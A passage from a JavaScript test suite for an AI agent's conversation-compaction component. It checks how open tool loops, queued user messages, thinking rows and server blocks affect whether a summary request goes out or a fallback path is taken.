    const loop = [U('Now check two more.'), X('mo', 'Running two checks.'), C('mo', 'oa'), C('mo', 'ob'), needed('oa'), needed('ob')];
    const run = await compactHost([...opening, ...singles(20, 1), ...loop]);
    expect(run.records()[0]).toMatchObject({ result: 'jev', kept_from: 5, server_blocks: 0 });
    for (const m of run.messages.slice(-5).filter((x) => x.role === 'assistant')) expect(run.out.messages).toContain(m);
    expect(run.request).toEqual(clean);
    // A message typed during the tool turn is a row of its own after the results; the loop is still open.
    const queued = await compactHost([...opening, ...singles(20, 1), ...loop, U('Also check the third one.')]);
    expect(queued.records()[0]).toMatchObject({ result: 'jev', kept_from: 6 });
    for (const m of queued.messages.slice(-6).filter((x) => x.role === 'assistant')) expect(queued.out.messages).toContain(m);
    expect(queued.request).toEqual(clean);
    const quick = [U('Now check two more.'), X('mo', 'Running two checks.'), C('mo', 'oa'), needed('oa'), C('mo', 'ob'), needed('ob')];
    const withApi = await compactHost([...opening, ...singles(20, 1), ...quick]);
    expect(withApi.records()[0]).toMatchObject({ result: 'jev', kept_from: 5 });
    for (const m of withApi.messages.slice(-5).filter((x) => x.role === 'assistant')) expect(withApi.out.messages).toContain(m);
    expect(withApi.request).toEqual(clean);
    const withoutApi = await compactHost([...opening, ...singles(20, 1), ...quick], { api: refused });
    expect(withoutApi.records()[0]).toMatchObject({ result: 'fallback', reason: 'no_api_form' });
    expect(withoutApi.calls.fetch).toHaveLength(0);
  });

  it('inside an open tool loop a thinking row or a server block among the kept rows runs the summary before any request', async () => {
    const thinking = await compactHost([...opening, ...singles(20, 1), U('Now check one more.'), T('mo'), C('mo', 'oa'), needed('oa')]);
    expect(thinking.records()[0]).toMatchObject({ result: 'fallback', reason: 'thinking_in_tail', kept_from: 3 });
    expect(thinking.calls.fetch).toHaveLength(0);
    const advice = await compactHost([...opening, ...singles(20, 1), U('Ask the advisor, then check.'), S('mo', 'srv1'), X('mo', 'The advisor agrees.'), C('mo', 'oa'), needed('oa')]);
    expect(advice.records()[0]).toMatchObject({ result: 'fallback', reason: 'server_block_in_tail', server_blocks: 1 });
    expect(advice.calls.fetch).toHaveLength(0);
  });

  it('takes the API form only in its shape and only when it holds every kept call', async () => {
    const loop = [U('Now check two more.'), X('mo', 'Running two checks.'), C('mo', 'oa'), C('mo', 'ob'), needed('oa'), needed('ob')];
    // A host that ignores `as: 'api'` answers the plain messages.
    const plain = (_opts, messages) => messages;
    const open = await compactHost([...opening, ...singles(20, 1), ...loop], { api: plain });
    expect(open.records()[0]).toMatchObject({ result: 'fallback', reason: 'no_api_form' });
    const between = await compactHost([...opening, ...singles(20, 1), ...closing], { api: plain });
    expect(between.records()[0]).toMatchObject({ result: 'jev', server_blocks: null, kept_from: 0 });
    expect(between.request).toEqual(clean);
    const missing = (_opts, _messages, api) => api.map((a) => (a.role === 'assistant' ? { ...a, content: a.content.filter((b) => b.id !== 'ob') } : a));
    const partial = await compactHost([...opening, ...singles(20, 1), ...loop], { api: missing });
    expect(partial.records()[0]).toMatchObject({ result: 'fallback', reason: 'no_api_form' });
    const sub = await compactHost([...opening, ...singles(20, 1), ...closing], { api: refused, event: { agentId: 'sub-1' } });
    expect(sub.records()[0]).toMatchObject({ result: 'jev', server_blocks: null, agent_id: 'sub-1' });
    expect(sub.asked).toEqual([{ as: 'api', agentId: 'sub-1' }]);
  });
});
